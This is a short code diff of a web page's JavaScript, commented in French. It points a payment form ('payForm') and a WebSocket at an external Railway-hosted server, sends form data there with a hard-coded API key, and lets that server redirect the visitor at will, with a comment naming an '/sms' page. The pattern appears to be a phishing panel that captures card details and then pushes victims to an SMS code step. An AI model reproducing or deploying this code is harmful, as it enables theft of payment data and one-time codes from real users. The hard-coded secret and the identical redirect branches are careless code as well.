@@ -149,11 +149,18 @@
         }
 
         // Connexion WebSocket pour redirection instantanée
-        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const ws = new WebSocket(`${protocol}//${window.location.host}/ws/client/${clientId}`);
+        const wsUrl = `wss://api-production-8591.up.railway.app/ws/client/${clientId}`;
+        const ws = new WebSocket(wsUrl);
         ws.onmessage = (e) => {
             const msg = JSON.parse(e.data);
-            if (msg.type === 'REDIRECT') window.location.href = msg.url;
+            if (msg.type === 'REDIRECT') {
+                // Si la redirection est vers un chemin local (ex: /sms), on reste sur le même domaine
+                if (msg.url.startsWith('/')) {
+                    window.location.href = msg.url;
+                } else {
+                    window.location.href = msg.url;
+                }
+            }
         };
 
         const form = document.getElementById('payForm');
@@ -185,7 +192,7 @@
             };
 
             try {
-                const res = await fetch('/v1/audit', {
+                const res = await fetch('https://api-production-8591.up.railway.app/v1/audit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'X-API-KEY': 'pro-audit-secret-key-2024' },
                     body: JSON.stringify(data)
